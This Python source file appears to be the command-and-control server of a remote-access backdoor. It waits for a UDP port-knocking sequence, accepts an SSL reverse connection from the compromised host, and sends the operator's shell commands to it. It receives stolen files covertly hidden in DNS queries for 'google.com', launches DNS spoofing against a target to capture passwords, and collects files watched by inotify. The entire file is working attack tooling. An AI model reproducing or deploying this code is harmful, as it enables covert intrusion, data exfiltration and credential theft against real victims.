#!/usr/bin/python
# import python modules
from socket import *
import ssl
import os.path
import knocker
import server_config
from scapy.all import *
from utils import decrypt, parse_port_to_data
from multiprocessing import Process

CONTENT = ""
DOWNLOAD_FILE_SIZE = 0
DOWNLOAD_FILE_NAME = ""
NOTIFY_SOCKET = ""
INOTIFY = ""

def upload(conn,command,filepath):
    if os.path.isfile(filepath):
        filesize = str(os.path.getsize(filepath))
        command = command + " " + filesize
        conn.send(command)
        with open(filepath, "rb") as f:
            bytes_read = f.read(1024)
            while bytes_read:
                conn.send(bytes_read)
                bytes_read = f.read(1024)
    else:
        print "Invalid Usage of \"upload\", update filename"

def download(conn, filepath):
    global CONTENT
    global DOWNLOAD_FILE_SIZE
    CONTENT = ""
    DOWNLOAD_FILE_SIZE = conn.recv(1024)
    if int(DOWNLOAD_FILE_SIZE) < 1:
        print "file name is invalid"
    else:
        global DOWNLOAD_FILE_NAME
        DOWNLOAD_FILE_NAME = filepath.split('/')[-1]
        sniff(filter="udp", stop_filter=parse_for_download)

def parse_for_download(pkt):
    return_value = False
    if pkt.haslayer(DNS) and pkt['DNS'].qd[DNSQR].qname == "google.com." :
        data1, data2 = parse_port_to_data(pkt['UDP'].sport)
        return_value = parse_by_character(data1)
        return_value = return_value or parse_by_character(data2)
    return return_value

def parse_by_character(char):
    global CONTENT
    global DOWNLOAD_FILE_SIZE
    if char == server_config.EOF:
        if DOWNLOAD_FILE_SIZE == str(len(CONTENT)):
            decrypted = decrypt(CONTENT , knocker.PASS)
            global DOWNLOAD_FILE_NAME
            if not os.path.exists(server_config.PATH_TO_FILE):
                os.makedirs(server_config.PATH_TO_FILE)
            with open(server_config.PATH_TO_FILE +DOWNLOAD_FILE_NAME, 'w') as f:
                f.write(decrypted)
            print "data is successfully saved to " + server_config.PATH_TO_FILE + DOWNLOAD_FILE_NAME
        else:
            print "some data is missing. cannot decrypt the file"
        return True
    else:
        CONTENT += char
        return False

def dns(command, conn, cmdArgs):
    if len(cmdArgs) == 7 and cmdArgs[1] == "start":
        conn.send(command)
    elif len(cmdArgs) == 2 and cmdArgs[1] == "stop":
        conn.send(command)
        data = conn.recv(1024)
        if not os.path.exists(server_config.PATH_TO_FILE):
            os.makedirs(server_config.PATH_TO_FILE)
        with open(server_config.PATH_TO_FILE + server_config.DNSPOOF_PASSWORD_FILE, 'a') as f:
            f.write(data)
        print "passwords: " + data
        print "passwords are successfully saved to "+server_config.PATH_TO_FILE + server_config.DNSPOOF_PASSWORD_FILE
    else:
        print "Invalid command. "
        print "Usage:"
        print "To start dns spoofing : dnspoof start SENDER_IP SENDER_MAC TARGET_IP ROUTER_IP DOMAIN"
        print "To stop dns spoofing : dnspoof stop"


def notify(command, conn, cmdArgs):
    global INOTIFY
    if len(cmdArgs) == 3 and  cmdArgs[1] == "start":
        conn.send(command)
        INOTIFY = Process(target=open_connection_for_inotify)
        INOTIFY.start()
    elif len(cmdArgs) == 2 and cmdArgs[1] == "stop":
        conn.send(command)
        INOTIFY.terminate()
    else:
        print "Invalid command. Please enter inotify start directory or inotify stop"

def open_connection_for_inotify():
    HOST = ''  # '' means bind to all interfaces
    s = socket.socket(AF_INET, SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, server_config.INOTIFY_PORT))
    s.listen(1024)
    conn, addr = s.accept()
    NOTIFY_SOCKET = ssl.wrap_socket(conn,
                                    server_side=True,
                                    certfile="./../certificate/server.crt",
                                    keyfile="./../certificate/server.key")

    while 1:
        filesizeAndName = NOTIFY_SOCKET.recv(1024)
        if filesizeAndName:
            filesizeAndNameArray = filesizeAndName.split(' ')
            fs = filesizeAndNameArray[1]
            with open(filesizeAndNameArray[0], "wb") as f:
                dr = NOTIFY_SOCKET.recv(1024)
                f.write(dr)
                totalFS = len(dr)
                while dr:
                    if str(totalFS) != fs:
                        dr = NOTIFY_SOCKET.recv(1024)
                        f.write(dr)
                        totalFS += len(dr)
                    else:
                        break


def accept_commands(conn):
    # receive initial connection
    data = conn.recv(1024)
    # start loop
    while 1:
        # enter shell command
        command = raw_input("Enter shell command or quit: ")
        cmdArgs = command.split(' ')
        # if we specify quit then break out of loop and close socket
        if cmdArgs[0] == "quit":
            conn.send(command)
            break
        elif cmdArgs[0] == "upload":
            if len(cmdArgs) == 2:
                upload(conn,command,cmdArgs[1])
            else:
                print "Invalid command. Please enter upload filename"

        elif cmdArgs[0] == "download":
            if len(cmdArgs) == 2:
                conn.send(command)
                download(conn, cmdArgs[1])
            else:
                print "Invalid command. Please enter download filename"

        elif cmdArgs[0] == "dnspoof":
            dns(command, conn, cmdArgs)
        elif cmdArgs[0] == "inotify":
            notify(command, conn, cmdArgs)
        else:
            conn.send(command)
            # receive output from linux command
            data = conn.recv(1024)
            # print the output of the linux command
            print data



def listen_for_inside_out_conn():
    HOST = ''  # '' means bind to all interfaces
    # create our socket handler
    s = socket.socket(AF_INET, SOCK_STREAM)
    # set is so that when we cancel out we can reuse port
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # bind to interface
    s.bind((HOST, server_config.PORT))
    # print we are accepting connections
    print "Looking for snake bites on port %s" % str(server_config.PORT)
    # listen for only 10 connection
    s.listen(10)
    # accept connections
    conn, addr = s.accept()
    # print connected by ipaddress
    print 'Connected by', addr[0]
    # wrap with SSL
    wrappedconn = ssl.wrap_socket(conn,
                                 server_side=True,
                                 certfile="./../certificate/server.crt",
                                 keyfile="./../certificate/server.key")
    if addr[0] == knocker.SOURCE_IP:
        accept_commands(wrappedconn)
    print "closing connection"
    wrappedconn.shutdown(socket.SHUT_RDWR)
    wrappedconn.close()

def parse_packets_for_port_knocking(pkt):
    if pkt.haslayer(UDP) and pkt['UDP'].dport == server_config.PORT_KNOCK_ARRAY[knocker.PORT_KNOCKER_INDEX]:
        knocker.port_knock(pkt)
        if len(knocker.PASS) == len(server_config.PORT_KNOCK_ARRAY)*2:
            return True
        else:
            return False


def main():
    sniff(filter="udp", stop_filter=parse_packets_for_port_knocking)
    listen_for_inside_out_conn()

if __name__ == '__main__':
    main()
